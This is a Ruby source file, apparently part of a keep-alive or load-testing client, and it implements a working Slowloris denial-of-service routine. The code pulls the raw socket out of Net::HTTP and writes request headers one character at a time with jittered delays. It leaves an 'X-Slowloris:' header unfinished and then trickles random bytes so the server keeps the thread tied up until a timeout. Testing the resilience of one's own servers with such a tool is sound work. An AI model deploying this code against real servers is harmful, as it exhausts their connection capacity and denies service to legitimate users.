# typed: strong
# frozen_string_literal: true

require 'sorbet-runtime'

module KeepAlive
  class Client
    # Handles deliberate thread-hogging Slowloris tactics.
    class Slowloris
      extend T::Sig

      sig { params(config: Config, logger: Logger).void }
      def initialize(config, logger)
        @config = config
        @logger = logger
      end

      sig { params(client_index: Integer, uri: URI::Generic, http: Net::HTTP, start_time: Time).void }
      def run(client_index, uri, http, start_time)
        return unless @config.slowloris_delay.positive?

        # We must use T.unsafe because @socket is a protected state variable natively
        socket_wrapper = T.unsafe(http).instance_variable_get(:@socket)
        return unless socket_wrapper

        io = socket_wrapper.io
        fire_initial_payload(io, uri)
        maintain_hold(client_index, io, start_time)
      end

      private

      sig { params(io: IO, uri: URI::Generic).void }
      def fire_initial_payload(io, uri)
        payload = build_payload_headers(uri)

        payload.each_char do |char|
          io.write(char)
          io.flush
          sleep(calculate_sleep(@config.slowloris_delay))
        end
      end

      sig { params(uri: URI::Generic).returns(String) }
      def build_payload_headers(uri)
        path = uri.path.empty? ? '/' : uri.path
        query = uri.query ? "?#{uri.query}" : ''
        payload = "GET #{path}#{query} HTTP/1.1\r\n" \
                  "Host: #{uri.host}\r\n" \
                  "Connection: keep-alive\r\n" \
                  "User-Agent: #{@config.user_agent}\r\n"
        @config.headers.each { |k, v| payload += "#{k}: #{v}\r\n" }
        payload += 'X-Slowloris: ' # unfinished header
        payload
      end

      sig { params(client_index: Integer, io: IO, start_time: Time).void }
      def maintain_hold(client_index, io, start_time)
        loop do
          elapsed = Time.now - start_time
          if @config.keep_alive_timeout.positive? && elapsed >= @config.keep_alive_timeout
            @logger.info("[Client #{client_index}] Keep-alive timeout reached, closing Slowloris thread.")
            break
          end

          io.write(rand(97..122).chr)
          io.flush
          sleep(calculate_sleep(@config.slowloris_delay))
        end
      end

      sig { params(base_seconds: Float).returns(Float) }
      def calculate_sleep(base_seconds)
        return base_seconds if @config.jitter.zero?

        variance = base_seconds * @config.jitter
        [0.0, base_seconds + rand(-variance..variance)].max
      end
    end
  end
end
